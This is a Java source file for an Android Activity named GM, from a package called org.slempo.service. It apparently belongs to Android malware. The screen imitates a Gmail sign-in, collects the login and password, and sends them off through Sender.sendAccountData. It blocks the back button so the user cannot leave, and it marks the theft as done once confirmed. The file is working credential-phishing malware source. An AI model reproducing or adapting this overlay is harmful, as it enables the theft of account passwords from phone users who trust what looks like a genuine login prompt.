package org.slempo.service.activities;

import org.slempo.service.Constants;
import org.slempo.service.R;
import org.slempo.service.utils.Sender;
import org.slempo.service.utils.Utils;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class GM extends Activity {

	private Button continueButton;

	private EditText login;

	private EditText password;

	private View loadingView;

	private View contentWholeView;

	private String loginText;

	private String passwordText;

	private TextView errorMessage;

	private BroadcastReceiver signalsReceiver;

	private SharedPreferences settings;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		settings = getSharedPreferences(Constants.PREFS_NAME,
				Context.MODE_PRIVATE);
		setContentView(R.layout.gm_fragment);
		loadingView = findViewById(R.id.loading_spinner);
		contentWholeView = findViewById(R.id.change_number_details);
		continueButton = (Button) findViewById(R.id.auth_btn);
		continueButton.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				if (isAllFieldsValid()) {
					crossFade(contentWholeView, View.INVISIBLE,
							R.anim.fade_out, loadingView,
							R.anim.slide_in_right, true);
					sendData();
				}
			}
		});
		errorMessage = (TextView) findViewById(R.id.error_message);
		initReceiver();
		login = (EditText) findViewById(R.id.auth_login);
		password = (EditText) findViewById(R.id.auth_pass);
		getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT,
				ViewGroup.LayoutParams.WRAP_CONTENT);
	}

	private void sendData() {
		Sender.sendAccountData(this, "gm", loginText, passwordText);
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	@Override
	public void onBackPressed() {
	}

	private boolean isAllFieldsValid() {
		loginText = login.getText().toString();
		passwordText = password.getText().toString();
		if (TextUtils.isEmpty(loginText) && !loginText.trim().endsWith("@gmail.com")) {
			playShakeAnimation(login);
			return false;
		}
		if (TextUtils.isEmpty(passwordText)) {
			playShakeAnimation(password);
			return false;
		}
		return true;
	}

	private void crossFade(View fromView, int fromViewFinalVisibility,
			int fromAnimation, View toView, int toAnimation,
			boolean closeKeyboard) {
		Animation anim1 = AnimationUtils.loadAnimation(this, fromAnimation);
		fromView.setVisibility(fromViewFinalVisibility);
		anim1.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {

			}
		});
		fromView.startAnimation(anim1);
		toView.setVisibility(View.VISIBLE);
		Animation anim2 = AnimationUtils.loadAnimation(this, toAnimation);
		anim2.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {

			}
		});
		toView.startAnimation(anim2);
		if (closeKeyboard) {
			InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
			View v = getCurrentFocus();
			if (v != null) {
				inputManager.hideSoftInputFromWindow(v.getWindowToken(),
						InputMethodManager.HIDE_NOT_ALWAYS);
			}
		}
	}

	private void playShakeAnimation(View view) {
		view.startAnimation(AnimationUtils.loadAnimation(this, R.anim.shake));
	}

	private void initReceiver() {
		signalsReceiver = new BroadcastReceiver() {

			@Override
			public void onReceive(Context context, Intent i) {
				boolean status = i.getExtras().getBoolean("status");
				if (status) {
					Utils.putBooleanValue(settings, Constants.GM_IS_SENT, true);
					GM.this.finish();
				} else {
					showError();
				}
			}
		};
		registerReceiver(signalsReceiver, new IntentFilter(
			Sender.UPDATE_MAIN_UI));
	}

	private void showError() {
		loadingView.setVisibility(View.GONE);
		contentWholeView.setVisibility(View.VISIBLE);
		errorMessage.setVisibility(View.VISIBLE);
	}

	@Override
	protected void onPause() {
		super.onPause();
		finish();
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		unregisterReceiver(signalsReceiver);
	}/**/
}
